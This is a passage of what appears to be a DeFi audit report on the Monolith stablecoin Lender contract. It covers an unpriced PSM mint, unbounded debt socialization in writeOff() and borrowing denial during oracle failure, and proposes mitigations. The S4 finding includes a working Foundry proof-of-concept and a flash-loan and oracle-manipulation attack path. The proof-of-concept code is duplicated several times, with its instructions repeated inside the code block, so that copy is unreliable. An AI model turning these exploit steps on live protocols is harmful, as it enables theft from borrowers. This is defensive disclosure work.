  Attacker deposits SHIB into buy()  
  SHIB deposited: 100000000000  
  
=== RESULT ===  
  Stablecoins minted: 100000000000  
  Minting ratio: 1 SHIB -> 1 stablecoin  
  No price check. No oracle. No valuation.  
  
=== ECONOMIC REALITY ===  
  Attacker spent ~ $1,000,000 worth of SHIB  
  Attacker received ~ $100,000,000,000 stablecoins  
  Protocol insolvent by ~99,999x  
  ```

## Mitigation

### Option 1: Require oracle-based pricing (Recommended)

```solidity
IChainlinkFeed public immutable psmAssetFeed; // Add oracle for PSM asset

function getBuyAmountOut(uint assetIn) public view returns (uint coinOut, uint coinFee) {  
    // Get PSM asset price in USD
    (, int256 psmPrice,,,) = psmAssetFeed.latestRoundData();  

    require(psmPrice > 0, "Invalid PSM asset price");  

    // Convert PSM asset to USD value
    uint psmValueUSD =
        assetIn *
        uint(psmPrice) /
        (10 ** psmAssetFeed.decimals());  

    // Mint based on economic value, not token count
    coinOut = psmValueUSD;

    // Apply fee
    uint buyFeeBps = getBuyFeeBps();  

    if (buyFeeBps > 0) {  
        coinFee = coinOut * buyFeeBps / 10000;  
        coinOut -= coinFee;  
    }  
}
```

### Option 2: Restrict PSM to verified stablecoins

```solidity
if (psmAsset != ERC20(address(0))) {  
    require(
        psmAsset == USDC ||
        psmAsset == USDT ||
        psmAsset == DAI,
        "PSM asset must be approved stablecoin"
    );  
}
```

---

# S4 - Protocol Will Become Insolvent Through Unlimited Bad Debt Socialization

## Summary
Unbounded debt redistribution in `Lender.writeOff()` will cause protocol death spiral as one large bad debt position redistributes unlimited debt to all remaining borrowers, creating cascading under-collateralization that leads to more writeoffs and eventual insolvency.

## Root Cause

In `Lender.sol:420-451`, when a position has `debt > collateralValue * 100`, the `writeOff()` function socializes **ALL debt** across remaining borrowers with no limit:

https://github.com/sherlock-audit/2025-12-monolith-stablecoin-factory/blob/main/Monolith/src/Lender.sol#L420C4-L451C17

```solidity
if (debt > collateralValue * 100) {  
    // 1. delete all of the borrower's debt
    decreaseDebt(borrower, type(uint).max);  

    // 2. redistribute excess debt among remaining borrowers
    uint256 totalDebt = totalFreeDebt + totalPaidDebt;  

    if (totalDebt > 0) {  
        uint256 freeDebtIncrease = debt * totalFreeDebt / totalDebt;  
        uint256 paidDebtIncrease = debt - freeDebtIncrease;  

        totalFreeDebt += freeDebtIncrease; // ❌ No limit!
        totalPaidDebt += paidDebtIncrease; // ❌ No limit!
    }  
}
```

This creates proportional debt increase for **ALL borrowers** through share dilution:

Example:

```text
If total debt is $1M
and writeoff adds $10M

New total debt: $11M
Each borrower's debt increases 11x
Many positions now under-collateralized
Death spiral begins
```

## Internal Pre-conditions

- Protocol has active borrowers with non-zero debt
- At least one whale position exists with massive debt
- Price oracle must allow liquidations (`allowLiquidations = true`)
- Position must meet writeoff criteria:

```text
debt > collateralValue * 100
```

## External Pre-conditions

- Collateral price crashes dramatically (e.g., LUNA crash, FTX collapse)

OR

- Whale position created with manipulated / bugged collateral

OR

- Flash crash temporarily meets writeoff criteria

## Attack Path

1. Scenario 1: Collateral Crash Cascade

### Initial State

Protocol has:

```text
100 borrowers
```

Total debt:

```text
$1,000,000
```

Composition:

```text
mix of free + paid debt
```

Average position:

```text
$10,000 debt
$15,000 collateral
healthy
```

Whale position:

```text
$10,000,000 debt
$12,000,000 collateral
Collateral factor: 85%
```

### Market Crash

Collateral drops:

```text
95%
```

Whale collateral:

```text
$12M → $600K
```

Whale debt remains:

```text
$10M
```

Writeoff trigger:

```text
$10M > $600K * 100 ✓
```

---

### First WriteOff (Whale Position)

```solidity
lender.writeOff(whale, liquidator);
```

Calculations:

```text
debt = $10M
totalDebt = $1M existing
```

Redistribution:

```text
freeDebtIncrease = $10M * $500K / $1M = $5M
paidDebtIncrease = $10M - $5M = $5M
```

Totals become:

```text
totalFreeDebt: $500K → $5.5M
totalPaidDebt: $500K → $5.5M
```

Result:

```text
11x increase
```

---

### Impact on Regular Users

Alice originally:

```text
$10K debt
$15K collateral
```

After debt socialization:

```text
$110K debt
$15K collateral
```

Now:

```text
733% over-leveraged
```

Alice now qualifies for writeoff.

---

### Cascading Writeoffs

```solidity
// Alice gets written off
writeOff(alice, liquidator);

// Adds another $110K debt to remaining users
```

Then:

```solidity
for (uint i = 0; i < 10; i++) {
    writeOff(victims[i], liquidator);
}
```

Effect:

```text
Each writeoff increases everyone else's debt
```

---

### Death Spiral

```text
Round 1:
1 whale writeoff
→ 10 users under-collateralized

Round 2:
10 writeoffs
→ 30 users under-collateralized

Round 3:
30 writeoffs
→ all remaining users under-collateralized
```

Final state:

```text
Total debt >> total collateral value
Protocol insolvent
```

2. Scenario 2: Malicious Whale Attack

### Attacker Creates Massive Position

Attacker:

```text
Flash loans $100M collateral
Borrows $85M stablecoins (85% CF)
Repeats across multiple accounts
```

Total attacker debt:

```text
$850M
```

### Attacker Triggers Writeoff

Methods:

- manipulate collateral price briefly
- oracle exploit
- flash crash
- wait for natural dip

Writeoff criteria becomes true.

### Debt Socialization

Protocol legitimate debt:

```text
$10M
```

Attacker debt redistributed:

```text
$850M
```

Effect:

```text
Each legitimate borrower debt increases 86x
```

Outcome:

```text
All legitimate users instantly insolvent
```

### Attacker Profit

Attacker keeps:

```text
$850M borrowed stablecoins
```

Collateral:

```text
returned to attacker in writeoff
```

Loss borne by:

```text
legitimate users
```

Protocol theft:

```text
$850M
```

## Impact

- Unlimited debt creation: no cap on socialized debt amount
- Cascade failures: one large writeoff triggers many more
- Protocol insolvency: total debt can exceed total collateral value by orders of magnitude
- Innocent victim punishment: healthy positions become toxic overnight
- Share price collapse: README acknowledges `>1M shares per 1 unit` risk — this is how it occurs
- No recovery mechanism: once death spiral starts, cannot be stopped
- Systemic risk: affects all borrowers, not just risky ones
- Bank run incentive: users race to exit before debt socialization hits them

## PoC

- Create a File Exploit.t.sol at test folder and paste the following code -
```solidity 
// SPDX-License-Identifier: UNLICENSED  
pragma solidity 0.8.24;  
  
import {Test, console} from "forge-std/Test.sol";  
import {  
    Lender,  
    ERC20,  
    Coin,  
    Vault,  
    InterestModel,  
    IChainlinkFeed,  
    IFactory,  
    ERC4626  
} from "src/Lender.sol";  
  
/*//////////////////////////////////////////////////////////////  
                            MOCKS  
//////////////////////////////////////////////////////////////*/  
  
contract ERC20Mock is ERC20 {  
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s, d) {}  
    function mint(address to, uint256 amt) external { _mint(to, amt); }  
}  
  
contract CoinMock is ERC20 {  
    constructor() ERC20("Monolith USD", "mUSD", 18) {}  
    function mint(address to, uint256 amt) external { _mint(to, amt); }  
    function burn(uint256 amt) external { _burn(msg.sender, amt); }  
}  
  
contract FeedMockCrash {  
    int256 public price = 2000e18;  
  
    function setPrice(int256 p) external {  
        price = p;  
    }  
  
    function latestRoundData()  
        external  
        view  
        returns (uint80, int256, uint256, uint256, uint80)  
    {  
        return (0, price, 0, block.timestamp, 0);  
    }  
  
    function decimals() external pure returns (uint8) { return 18; }  
}  
  
contract VaultMock {  
    function totalAssets() external pure returns (uint256) {  
        return 1e18;  
    }  
}  
  
contract InterestModelMock {  
    function calculateInterest(  
        uint, uint, uint, uint, uint, uint, uint  
    ) external pure returns (uint, uint) {  
        return (1e18, 0);  
    }  
}  
  
contract FactoryMock {  
    function getFeeOf(address) external pure returns (uint) { return 0; }  
    function minDebtFloor() external pure returns (uint) { return 1e15; }  
}  
  
/*//////////////////////////////////////////////////////////////  
                            POC  
//////////////////////////////////////////////////////////////*/  
  
contract POC_DebtSpiral is Test {  
    Lender lender;  
    ERC20Mock collateral;  
    CoinMock coin;  
    FeedMockCrash feed;  
  
    address whale = address(0xAAA);  
    address alice = address(0xBBB);  
    address bob   = address(0xCCC);  
  
    function setUp() public {  
        collateral = new ERC20Mock("WETH", "WETH", 18);  
        coin = new CoinMock();  
        feed = new FeedMockCrash();  
  
        lender = new Lender(  
            Lender.LenderParams({  
                collateral: ERC20(address(collateral)),  
                psmAsset: ERC20(address(0)),  
                psmVault: ERC4626(address(0)),  
                feed: IChainlinkFeed(address(feed)),  
                coin: Coin(address(coin)),  
                vault: Vault(address(new VaultMock())),  
                interestModel: InterestModel(address(new InterestModelMock())),  
                factory: IFactory(address(new FactoryMock())),  
                operator: address(this),  
                manager: address(this),  
                collateralFactor: 8500,  
                minDebt: 1e15,  
                timeUntilImmutability: 365 days,  
                halfLife: 7 days,  
                targetFreeDebtRatioStartBps: 2000,  
                targetFreeDebtRatioEndBps: 4000,  
                redeemFeeBps: 30,  
                stalenessThreshold: 1 hours,  
                maxBorrowDeltaBps: 50,  
                minTotalSupply: 1  
            })  
        );  
  
        vm.etch(address(coin), address(new CoinMock()).code);  
        coin = CoinMock(address(lender.coin()));  
    }  
  
    function test_Unbounded_WriteOff_DeathSpiral() public {  
  
        /*//////////////////////////////////////////////////////////////  
                        HEALTHY USERS  
        //////////////////////////////////////////////////////////////*/  
  
        uint256 userCollateral = 15 ether;  
        uint256 userDebt = 10_000e18;  
  
        collateral.mint(alice, userCollateral);  
        collateral.mint(bob, userCollateral);  
  
        vm.startPrank(alice);  
        collateral.approve(address(lender), userCollateral);  
        lender.adjust(alice, int256(userCollateral), int256(userDebt), false);  
        vm.stopPrank();  
  
        vm.startPrank(bob);  
        collateral.approve(address(lender), userCollateral);  
        lender.adjust(bob, int256(userCollateral), int256(userDebt), false);  
        vm.stopPrank();  
  
        uint256 aliceDebtBefore = lender.getDebtOf(alice);  
        uint256 bobDebtBefore = lender.getDebtOf(bob);  
  
        console.log("Alice debt before:", aliceDebtBefore / 1e18);  
        console.log("Bob   debt before:", bobDebtBefore / 1e18);  
  
        /*//////////////////////////////////////////////////////////////  
                        SOLVENT WHALE  
        //////////////////////////////////////////////////////////////*/  
  
        uint256 whaleCollateral = 12_000 ether;          // $24M @ $2000  
        uint256 whaleDebt = 15_000_000e18;               // Safe at 85%  
  
        collateral.mint(whale, whaleCollateral);  
  
        vm.startPrank(whale);  
        collateral.approve(address(lender), whaleCollateral);  
        lender.adjust(whale, int256(whaleCollateral), int256(whaleDebt), false);  
        vm.stopPrank();  
  
        console.log("\nWhale opened SOLVENT position:");  
        console.log("Collateral:", whaleCollateral / 1e18, "ETH");  
        console.log("Debt:", whaleDebt / 1e18, "USD");  
  
        /*//////////////////////////////////////////////////////////////  
                        MARKET CRASH  
        //////////////////////////////////////////////////////////////*/  
  
        feed.setPrice(10e18); // $10 ETH (−99.5%)  
  
        console.log("\nMarket crash:");  
        console.log("ETH price:", 10, "USD");  
        console.log("Whale collateral value:", 12_000 * 10, "USD");  
        console.log("Whale debt:", 15_000_000, "USD");  
        console.log("Writeoff condition met");  
  
        /*//////////////////////////////////////////////////////////////  
                        WRITE OFF  
        //////////////////////////////////////////////////////////////*/  
  
        lender.writeOff(whale, address(this));  
  
        uint256 aliceDebtAfter = lender.getDebtOf(alice);  
        uint256 bobDebtAfter = lender.getDebtOf(bob);  
  
        console.log("\n--- AFTER WRITEOFF ---");  
        console.log("Alice debt after:", aliceDebtAfter / 1e18);  
        console.log("Bob   debt after:", bobDebtAfter / 1e18);  
  
        console.log("\n--- MULTIPLIER ---");  
        console.log("Alice multiplier:", aliceDebtAfter / aliceDebtBefore, "x");  
        console.log("Bob   multiplier:", bobDebtAfter / bobDebtBefore, "x");  
  
        console.log("\n>>> DEATH SPIRAL CONFIRMED <<<");  
        console.log("Healthy users became insolvent due to whale writeoff");  
        console.log("Subsequent writeoffs will cascade");  
  
        assertGt(aliceDebtAfter, aliceDebtBefore * 100);  
        assertGt(bobDebtAfter, bobDebtBefore * 100);  
    }  
}  
  
Now run command
forge test --mt test_Unbounded_WriteOff_DeathSpiral -vv  
Expected Output
Create a File Exploit.t.sol at test folder and paste the following code -
// SPDX-License-Identifier: UNLICENSED  
pragma solidity 0.8.24;  
  
import {Test, console} from "forge-std/Test.sol";  
import {  
    Lender,  
    ERC20,  
    Coin,  
    Vault,  
    InterestModel,  
    IChainlinkFeed,  
    IFactory,  
    ERC4626  
} from "src/Lender.sol";  
  
/*//////////////////////////////////////////////////////////////  
                            MOCKS  
//////////////////////////////////////////////////////////////*/  
  
contract ERC20Mock is ERC20 {  
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s, d) {}  
    function mint(address to, uint256 amt) external { _mint(to, amt); }  
}  
  
contract CoinMock is ERC20 {  
    constructor() ERC20("Monolith USD", "mUSD", 18) {}  
    function mint(address to, uint256 amt) external { _mint(to, amt); }  
    function burn(uint256 amt) external { _burn(msg.sender, amt); }  
}  
  
contract FeedMockCrash {  
    int256 public price = 2000e18;  
  
    function setPrice(int256 p) external {  
        price = p;  
    }  
  
    function latestRoundData()  
        external  
        view  
        returns (uint80, int256, uint256, uint256, uint80)  
    {  
        return (0, price, 0, block.timestamp, 0);  
    }  
  
    function decimals() external pure returns (uint8) { return 18; }  
}  
  
contract VaultMock {  
    function totalAssets() external pure returns (uint256) {  
        return 1e18;  
    }  
}  
  
contract InterestModelMock {  
    function calculateInterest(  
        uint, uint, uint, uint, uint, uint, uint  
    ) external pure returns (uint, uint) {  
        return (1e18, 0);  
    }  
}  
  
contract FactoryMock {  
    function getFeeOf(address) external pure returns (uint) { return 0; }  
    function minDebtFloor() external pure returns (uint) { return 1e15; }  
}  
  
/*//////////////////////////////////////////////////////////////  
                            POC  
//////////////////////////////////////////////////////////////*/  
  
contract POC_DebtSpiral is Test {  
    Lender lender;  
    ERC20Mock collateral;  
    CoinMock coin;  
    FeedMockCrash feed;  
  
    address whale = address(0xAAA);  
    address alice = address(0xBBB);  
    address bob   = address(0xCCC);  
  
    function setUp() public {  
        collateral = new ERC20Mock("WETH", "WETH", 18);  
        coin = new CoinMock();  
        feed = new FeedMockCrash();  
  
        lender = new Lender(  
            Lender.LenderParams({  
                collateral: ERC20(address(collateral)),  
                psmAsset: ERC20(address(0)),  
                psmVault: ERC4626(address(0)),  
                feed: IChainlinkFeed(address(feed)),  
                coin: Coin(address(coin)),  
                vault: Vault(address(new VaultMock())),  
                interestModel: InterestModel(address(new InterestModelMock())),  
                factory: IFactory(address(new FactoryMock())),  
                operator: address(this),  
                manager: address(this),  
                collateralFactor: 8500,  
                minDebt: 1e15,  
                timeUntilImmutability: 365 days,  
                halfLife: 7 days,  
                targetFreeDebtRatioStartBps: 2000,  
                targetFreeDebtRatioEndBps: 4000,  
                redeemFeeBps: 30,  
                stalenessThreshold: 1 hours,  
                maxBorrowDeltaBps: 50,  
                minTotalSupply: 1  
            })  
        );  
  
        vm.etch(address(coin), address(new CoinMock()).code);  
        coin = CoinMock(address(lender.coin()));  
    }  
  
    function test_Unbounded_WriteOff_DeathSpiral() public {  
  
        /*//////////////////////////////////////////////////////////////  
                        HEALTHY USERS  
        //////////////////////////////////////////////////////////////*/  
  
        uint256 userCollateral = 15 ether;  
        uint256 userDebt = 10_000e18;  
  
        collateral.mint(alice, userCollateral);  
        collateral.mint(bob, userCollateral);  
  
        vm.startPrank(alice);  
        collateral.approve(address(lender), userCollateral);  
        lender.adjust(alice, int256(userCollateral), int256(userDebt), false);  
        vm.stopPrank();  
  
        vm.startPrank(bob);  
        collateral.approve(address(lender), userCollateral);  
        lender.adjust(bob, int256(userCollateral), int256(userDebt), false);  
        vm.stopPrank();  
  
        uint256 aliceDebtBefore = lender.getDebtOf(alice);  
        uint256 bobDebtBefore = lender.getDebtOf(bob);  
  
        console.log("Alice debt before:", aliceDebtBefore / 1e18);  
        console.log("Bob   debt before:", bobDebtBefore / 1e18);  
  
        /*//////////////////////////////////////////////////////////////  
                        SOLVENT WHALE  
        //////////////////////////////////////////////////////////////*/  
  
        uint256 whaleCollateral = 12_000 ether;          // $24M @ $2000  
        uint256 whaleDebt = 15_000_000e18;               // Safe at 85%  
  
        collateral.mint(whale, whaleCollateral);  
  
        vm.startPrank(whale);  
        collateral.approve(address(lender), whaleCollateral);  
        lender.adjust(whale, int256(whaleCollateral), int256(whaleDebt), false);  
        vm.stopPrank();  
  
        console.log("\nWhale opened SOLVENT position:");  
        console.log("Collateral:", whaleCollateral / 1e18, "ETH");  
        console.log("Debt:", whaleDebt / 1e18, "USD");  
  
        /*//////////////////////////////////////////////////////////////  
                        MARKET CRASH  
        //////////////////////////////////////////////////////////////*/  
  
        feed.setPrice(10e18); // $10 ETH (−99.5%)  
  
        console.log("\nMarket crash:");  
        console.log("ETH price:", 10, "USD");  
        console.log("Whale collateral value:", 12_000 * 10, "USD");  
        console.log("Whale debt:", 15_000_000, "USD");  
        console.log("Writeoff condition met");  
  
        /*//////////////////////////////////////////////////////////////  
                        WRITE OFF  
        //////////////////////////////////////////////////////////////*/  
  
        lender.writeOff(whale, address(this));  
  
        uint256 aliceDebtAfter = lender.getDebtOf(alice);  
        uint256 bobDebtAfter = lender.getDebtOf(bob);  
  
        console.log("\n--- AFTER WRITEOFF ---");  
        console.log("Alice debt after:", aliceDebtAfter / 1e18);  
        console.log("Bob   debt after:", bobDebtAfter / 1e18);  
  
        console.log("\n--- MULTIPLIER ---");  
        console.log("Alice multiplier:", aliceDebtAfter / aliceDebtBefore, "x");  
        console.log("Bob   multiplier:", bobDebtAfter / bobDebtBefore, "x");  
  
        console.log("\n>>> DEATH SPIRAL CONFIRMED <<<");  
        console.log("Healthy users became insolvent due to whale writeoff");  
        console.log("Subsequent writeoffs will cascade");  
  
        assertGt(aliceDebtAfter, aliceDebtBefore * 100);  
        assertGt(bobDebtAfter, bobDebtBefore * 100);  
    }  
}  
  
Now run command
forge test --mt test_Unbounded_WriteOff_DeathSpiral -vv  
Expected Output
Create a File Exploit.t.sol at test folder and paste the following code -
// SPDX-License-Identifier: UNLICENSED  
pragma solidity 0.8.24;  
  
import {Test, console} from "forge-std/Test.sol";  
import {  
    Lender,  
    ERC20,  
    Coin,  
    Vault,  
    InterestModel,  
    IChainlinkFeed,  
    IFactory,  
    ERC4626  
} from "src/Lender.sol";  
  
/*//////////////////////////////////////////////////////////////  
                            MOCKS  
//////////////////////////////////////////////////////////////*/  
  
contract ERC20Mock is ERC20 {  
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s, d) {}  
    function mint(address to, uint256 amt) external { _mint(to, amt); }  
}  
  
contract CoinMock is ERC20 {  
    constructor() ERC20("Monolith USD", "mUSD", 18) {}  
    function mint(address to, uint256 amt) external { _mint(to, amt); }  
    function burn(uint256 amt) external { _burn(msg.sender, amt); }  
}  
  
contract FeedMockCrash {  
    int256 public price = 2000e18;  
  
    function setPrice(int256 p) external {  
        price = p;  
    }  
  
    function latestRoundData()  
        external  
        view  
        returns (uint80, int256, uint256, uint256, uint80)  
    {  
        return (0, price, 0, block.timestamp, 0);  
    }  
  
    function decimals() external pure returns (uint8) { return 18; }  
}  
  
contract VaultMock {  
    function totalAssets() external pure returns (uint256) {  
        return 1e18;  
    }  
}  
  
contract InterestModelMock {  
    function calculateInterest(  
        uint, uint, uint, uint, uint, uint, uint  
    ) external pure returns (uint, uint) {  
        return (1e18, 0);  
    }  
}  
  
contract FactoryMock {  
    function getFeeOf(address) external pure returns (uint) { return 0; }  
    function minDebtFloor() external pure returns (uint) { return 1e15; }  
}  
  
/*//////////////////////////////////////////////////////////////  
                            POC  
//////////////////////////////////////////////////////////////*/  
  
contract POC_DebtSpiral is Test {  
    Lender lender;  
    ERC20Mock collateral;  
    CoinMock coin;  
    FeedMockCrash feed;  
  
    address whale = address(0xAAA);  
    address alice = address(0xBBB);  
    address bob   = address(0xCCC);  
  
    function setUp() public {  
        collateral = new ERC20Mock("WETH", "WETH", 18);  
        coin = new CoinMock();  
        feed = new FeedMockCrash();  
  
        lender = new Lender(  
            Lender.LenderParams({  
                collateral: ERC20(address(collateral)),  
                psmAsset: ERC20(address(0)),  
                psmVault: ERC4626(address(0)),  
                feed: IChainlinkFeed(address(feed)),  
                coin: Coin(address(coin)),  
                vault: Vault(address(new VaultMock())),  
                interestModel: InterestModel(address(new InterestModelMock())),  
                factory: IFactory(address(new FactoryMock())),  
                operator: address(this),  
                manager: address(this),  
                collateralFactor: 8500,  
                minDebt: 1e15,  
                timeUntilImmutability: 365 days,  
                halfLife: 7 days,  
                targetFreeDebtRatioStartBps: 2000,  
                targetFreeDebtRatioEndBps: 4000,  
                redeemFeeBps: 30,  
                stalenessThreshold: 1 hours,  
                maxBorrowDeltaBps: 50,  
                minTotalSupply: 1  
            })  
        );  
  
        vm.etch(address(coin), address(new CoinMock()).code);  
        coin = CoinMock(address(lender.coin()));  
    }  
  
    function test_Unbounded_WriteOff_DeathSpiral() public {  
  
        /*//////////////////////////////////////////////////////////////  
                        HEALTHY USERS  
        //////////////////////////////////////////////////////////////*/  
  
        uint256 userCollateral = 15 ether;  
        uint256 userDebt = 10_000e18;  
  
        collateral.mint(alice, userCollateral);  
        collateral.mint(bob, userCollateral);  
  
        vm.startPrank(alice);  
        collateral.approve(address(lender), userCollateral);  
        lender.adjust(alice, int256(userCollateral), int256(userDebt), false);  
        vm.stopPrank();  
  
        vm.startPrank(bob);  
        collateral.approve(address(lender), userCollateral);  
        lender.adjust(bob, int256(userCollateral), int256(userDebt), false);  
        vm.stopPrank();  
  
        uint256 aliceDebtBefore = lender.getDebtOf(alice);  
        uint256 bobDebtBefore = lender.getDebtOf(bob);  
  
        console.log("Alice debt before:", aliceDebtBefore / 1e18);  
        console.log("Bob   debt before:", bobDebtBefore / 1e18);  
  
        /*//////////////////////////////////////////////////////////////  
                        SOLVENT WHALE  
        //////////////////////////////////////////////////////////////*/  
  
        uint256 whaleCollateral = 12_000 ether;          // $24M @ $2000  
        uint256 whaleDebt = 15_000_000e18;               // Safe at 85%  
  
        collateral.mint(whale, whaleCollateral);  
  
        vm.startPrank(whale);  
        collateral.approve(address(lender), whaleCollateral);  
        lender.adjust(whale, int256(whaleCollateral), int256(whaleDebt), false);  
        vm.stopPrank();  
  
        console.log("\nWhale opened SOLVENT position:");  
        console.log("Collateral:", whaleCollateral / 1e18, "ETH");  
        console.log("Debt:", whaleDebt / 1e18, "USD");  
  
        /*//////////////////////////////////////////////////////////////  
                        MARKET CRASH  
        //////////////////////////////////////////////////////////////*/  
  
        feed.setPrice(10e18); // $10 ETH (−99.5%)  
  
        console.log("\nMarket crash:");  
        console.log("ETH price:", 10, "USD");  
        console.log("Whale collateral value:", 12_000 * 10, "USD");  
        console.log("Whale debt:", 15_000_000, "USD");  
        console.log("Writeoff condition met");  
  
        /*//////////////////////////////////////////////////////////////  
                        WRITE OFF  
        //////////////////////////////////////////////////////////////*/  
  
        lender.writeOff(whale, address(this));  
  
        uint256 aliceDebtAfter = lender.getDebtOf(alice);  
        uint256 bobDebtAfter = lender.getDebtOf(bob);  
  
        console.log("\n--- AFTER WRITEOFF ---");  
        console.log("Alice debt after:", aliceDebtAfter / 1e18);  
        console.log("Bob   debt after:", bobDebtAfter / 1e18);  
  
        console.log("\n--- MULTIPLIER ---");  
        console.log("Alice multiplier:", aliceDebtAfter / aliceDebtBefore, "x");  
        console.log("Bob   multiplier:", bobDebtAfter / bobDebtBefore, "x");  
  
        console.log("\n>>> DEATH SPIRAL CONFIRMED <<<");  
        console.log("Healthy users became insolvent due to whale writeoff");  
        console.log("Subsequent writeoffs will cascade");  
  
        assertGt(aliceDebtAfter, aliceDebtBefore * 100);  
        assertGt(bobDebtAfter, bobDebtBefore * 100);  
    }  
} 
```  
- Now run command
```solidity 
forge test --mt test_Unbounded_WriteOff_DeathSpiral -vv  
```
- Expected Output
```solidity 
[PASS] test_Unbounded_WriteOff_DeathSpiral() (gas: 521381)  
Logs:  
  Alice debt before: 10000  
  Bob   debt before: 10000  
  
Whale opened SOLVENT position:  
  Collateral: 12000 ETH  
  Debt: 15000000 USD  
  
Market crash:  
  ETH price: 10 USD  
  Whale collateral value: 120000 USD  
  Whale debt: 15000000 USD  
  Writeoff condition met  
  
--- AFTER WRITEOFF ---  
  Alice debt after: 7510000  
  Bob   debt after: 7510000  
  
--- MULTIPLIER ---  
  Alice multiplier: 751 x  
  Bob   multiplier: 751 x  
  
>>> DEATH SPIRAL CONFIRMED <<<  
  Healthy users became insolvent due to whale writeoff  
  Subsequent writeoffs will cascade  
```

## Mitigation

### Option 1: Cap writeoff amounts (Recommended)

```solidity
uint256 constant MAX_WRITEOFF_RATIO = 100; // Max 1% of total debt per writeoff

function writeOff(address borrower, address to) external returns (bool writtenOff) {
    // ... existing checks ...

    if (debt > collateralValue * 100) {
        uint256 totalDebt = totalFreeDebt + totalPaidDebt;

        // Cap writeoff at percentage of total debt
        uint256 maxWriteoff = totalDebt / MAX_WRITEOFF_RATIO;

        if (debt > maxWriteoff) {
            // Partial writeoff only
            decreaseDebt(borrower, maxWriteoff);

            // Remaining debt stays with borrower
            debt = maxWriteoff;
        } else {
            decreaseDebt(borrower, type(uint).max);
        }

        // Redistribute capped amount
        if (totalDebt > 0) {
            uint256 freeDebtIncrease =
                debt * totalFreeDebt / totalDebt;

            uint256 paidDebtIncrease =
                debt - freeDebtIncrease;

            totalFreeDebt += freeDebtIncrease;
            totalPaidDebt += paidDebtIncrease;
        }

        // ... rest of logic ...
    }
}
```

### Option 2: Require governance approval for large writeoffs

```solidity
uint256 constant GOVERNANCE_THRESHOLD = 10_000e18; // $10k

mapping(address => bool) public governanceApprovedWriteoffs;

function writeOff(address borrower, address to)
    external
    returns (bool writtenOff)
{
    // ... existing checks ...

    if (debt > collateralValue * 100) {
        if (debt > GOVERNANCE_THRESHOLD) {
            require(
                governanceApprovedWriteoffs[borrower],
                "Large writeoff needs governance approval"
            );
        }

        // ... proceed with writeoff ...
    }
}

function approveWriteoff(address borrower)
    external
    onlyOperator
{
    governanceApprovedWriteoffs[borrower] = true;
}
```

### Option 3: Insurance fund for bad debt

```solidity
uint256 public insuranceFund;  
  
function contributeToInsurance() external payable {  
    insuranceFund += msg.value;  
}  
  
function writeOff(address borrower, address to) external returns (bool writtenOff) {  
    // ... existing checks ...  
      
    if(debt > collateralValue * 100) {  
        // Use insurance fund first  
        if (insuranceFund >= debt) {  
            insuranceFund -= debt;  
            decreaseDebt(borrower, type(uint).max);  
            // Don't socialize  
        } else {  
            // Socialize only amount exceeding insurance  
            uint socializedDebt = debt - insuranceFund;  
            insuranceFund = 0;  
              
            // Redistribute only excess  
            // ... socialization logic  
        }  
    }  
}  
```

---

# S5 - Users Will Be Unable to Borrow During Oracle Failure Due to Zero Borrowing Power

## Summary

Oracle failure handling in `Lender.adjust()` will cause complete borrowing DOS as when oracle returns zero price or reverts, borrowing power becomes zero, causing all borrow transactions to revert with `"Solvency check failed"`, effectively blocking protocol's primary function.

## Root Cause

In `Lender.sol:241-322`, borrowing power calculation uses price directly:

https://github.com/sherlock-audit/2025-12-monolith-stablecoin-factory/blob/main/Monolith/src/Lender.sol#L241C5-L322C9

```solidity
(uint price, bool reduceOnly, ) = getCollateralPrice();

require(!reduceOnly, "Reduce only");

uint borrowingPower =
    price *
    _cachedCollateralBalances[account] *
    collateralFactor /
    1e18 /
    10000;

require(debtBalance <= borrowingPower, "Solvency check failed");
```

When oracle fails:

```solidity
// In getCollateralPrice():

try this.getFeedPrice() returns (...) {
    if (price == 0) {
        reduceOnly = true; // ✓ Catches this
    }
} catch {
    reduceOnly = true; // ✓ Catches this
}

price = price == 0 ? 1 : price; // Sets to 1 if zero
```

Two scenarios:

### Scenario 1: `reduceOnly = true`

```solidity
require(!reduceOnly, "Reduce only");
```

Result:

```text
Transaction reverts with clear message
User understands oracle is down
```

---

### Scenario 2: `reduceOnly = false but price = 1`

```solidity
borrowingPower =
    1 *
    collateral *
    8500 /
    1e18 /
    10000;

≈ 0
```

Then:

```solidity
require(debtBalance <= borrowingPower, "Solvency check failed");
```

Result:

```text
Transaction reverts
User receives misleading solvency error
Actual root cause is oracle failure
```

## Internal Pre-conditions

- User attempting to borrow (`increase debt`)
- Oracle must fail or return invalid price
- User has collateral deposited

## External Pre-conditions

- Chainlink oracle downtime or failure

OR

- staleness > 24 hours

OR

- oracle manipulation

## Attack Path

### Scenario: Oracle Downtime Blocks All Borrowing

#### Normal Operation

Alice has:

```text
10 ETH collateral
```

Oracle price:

```text
$2000 / ETH
```

Borrowing power:

```text
2000 * 10 * 0.85 = $17,000
```

Alice can borrow:

```text
up to $17,000
```

---

#### Oracle Goes Down

Examples:

- Chainlink network congestion
- feed stops updating
- after 24+ hours staleness logic activates

---

#### Price Becomes Invalid

```solidity
// In getCollateralPrice():

stalenessDuration >= 24 hours

price = price * 0 / 24 hours = 0

price = price == 0 ? 1 : price;
```

Result:

```text
price = 1
```

And:

```text
reduceOnly = true (but not always caught)
```

---

#### Alice Tries to Borrow

```solidity
lender.adjust(alice, 0, 5000e18); // Borrow $5000
```

Branch 1:

```solidity
if (reduceOnly == true) {
    revert("Reduce only");
}
```

Result:

```text
Clear oracle-related failure
```

Branch 2:

```solidity
reduceOnly == false
price == 1
```

Borrowing power:

```solidity
borrowingPower =
    1 *
    10e18 *
    8500 /
    1e18 /
    10000;

= 8.5
```

Check:

```solidity
require(5000e18 <= 8.5, "Solvency check failed");
```

Result:

```text
REVERT
Misleading solvency error
```

---

#### All Users Blocked

```text
100% of borrow transactions fail
```

Effects:

- protocol primary function disabled
- users confused by incorrect error
- complete DOS until oracle recovers

### Scenario 2: Partial Outage - No New Borrows

#### Existing Positions OK

Users can:

- repay debt
- reduce collateral (if solvent)

But:

```text
cannot increase debt
```

---

#### New Users Blocked

Cannot open positions.

Even with:

```text
$1M collateral
```

Borrowing power becomes:

```text
~0.85
```

Effect:

```text
Protocol growth stops
```

---

#### Competitive Disadvantage

Other lending protocols:

- Aave
- Compound

use:

- fallback oracles
- degraded operating modes

Users migrate away.

Protocol loses market share.

## Impact

- Complete borrowing DOS: no new debt can be created
- Protocol revenue loss: no new loans = no interest revenue
- User frustration: unclear error messages
